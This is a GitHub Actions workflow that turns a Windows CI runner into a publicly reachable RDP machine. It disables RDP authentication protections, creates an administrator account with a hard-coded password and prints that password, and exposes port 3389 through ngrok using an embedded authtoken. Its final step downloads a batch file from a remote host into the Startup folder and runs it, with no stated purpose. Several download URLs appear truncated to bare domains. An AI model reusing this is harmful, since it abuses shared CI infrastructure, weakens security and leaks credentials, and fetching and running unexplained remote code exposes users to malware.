name: win 11

on:
  workflow_dispatch:

jobs:
  secure-rdp:
    runs-on: windows-2022
    timeout-minutes: 350

    steps:
      - name: Configure Core RDP Settings
        run: |
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "SecurityLayer" -Value 0 -Force
          
          netsh advfirewall firewall delete rule name="RDP-Global"
          netsh advfirewall firewall add rule name="RDP-Global" dir=in action=allow protocol=TCP localport=3389
          Restart-Service -Name TermService -Force

      - name: Create RDP User with Fixed Password
        run: |
          $password = "TechZoner@001"
          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
          if (-not (Get-LocalUser -Name "RDP" -ErrorAction SilentlyContinue)) {
              New-LocalUser -Name "RDP" -Password $securePass -AccountNeverExpires
          }
          Add-LocalGroupMember -Group "Administrators" -Member "RDP"
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP"

      - name: Install and Start ngrok Tunnel
        shell: powershell
        run: |
          # Force TLS 1.2 and download ngrok reliably
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          $tsUrl = "https://equinox.io"
          
          Write-Host "Downloading ngrok..."
          $webClient = New-Object System.Net.WebClient
          $webClient.DownloadFile($tsUrl, "ngrok.zip")
          
          # Verify if file downloaded correctly
          if (-not (Test-Path "ngrok.zip") -or (Get-Item "ngrok.zip").Length -lt 10000) {
              Write-Host "Retrying download with Invoke-WebRequest..."
              Invoke-WebRequest -Uri $tsUrl -OutFile "ngrok.zip" -UseBasicParsing
          }

          Write-Host "Extracting ngrok..."
          Expand-Archive -Path "ngrok.zip" -DestinationPath "." -Force
          
          # Authenticate ngrok using your token directly
          .\ngrok.exe authtoken "3GAmkQyZ4aTDXmW8gL8bAYj5fD3_7U3pzSH4fnHg4ReB2pfiB"
          
          # Start TCP tunnel on RDP port 3389
          Start-Process .\ngrok.exe -ArgumentList "tcp 3389" -WindowStyle Hidden
          Start-Sleep -Seconds 15
          
          # Fetch the public URL from ngrok local API
          $ngrokApi = Invoke-RestMethod http://localhost:4040/api/tunnels
          $publicUrl = $ngrokApi.tunnels.public_url
          
          # Clean the tcp:// prefix for RDP client
          $rdpAddress = $publicUrl -replace "tcp://", ""
          
          Write-Host "`n==============================================="
          Write-Host "🚀 RDP BAĞLANTI BİLGİLERİ"
          Write-Host "Adres (Computer): $rdpAddress"
          Write-Host "Kullanıcı Adı: RDP"
          Write-Host "Şifre: TechZoner@001"
          Write-Host "===============================================\n"

      - name: Maintain Connection + Watch RDP User
        run: |
          $rdpProfile = "C:\Users\RDP"
          $startupPath = "$rdpProfile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
          $downloadUrl = "https://gitlab.com"
          $downloadPath = "$startupPath\Downloads.bat"

          while ($true) {
              if (Test-Path $rdpProfile) {
                  try {
                      if (-not (Test-Path $startupPath)) {
                          New-Item -ItemType Directory -Path $startupPath -Force | Out-Null
                      }
                      Invoke-WebRequest -Uri $downloadUrl -OutFile $downloadPath -UseBasicParsing
                      cmd /c $downloadPath
                      break
                  }
                  catch {
                      break
                  }
              }
              else {
                  Start-Sleep -Seconds 30
              }
          }

          while ($true) {
              Write-Host "[$(Get-Date)] RDP Active..."
              Start-Sleep -Seconds 300
          }
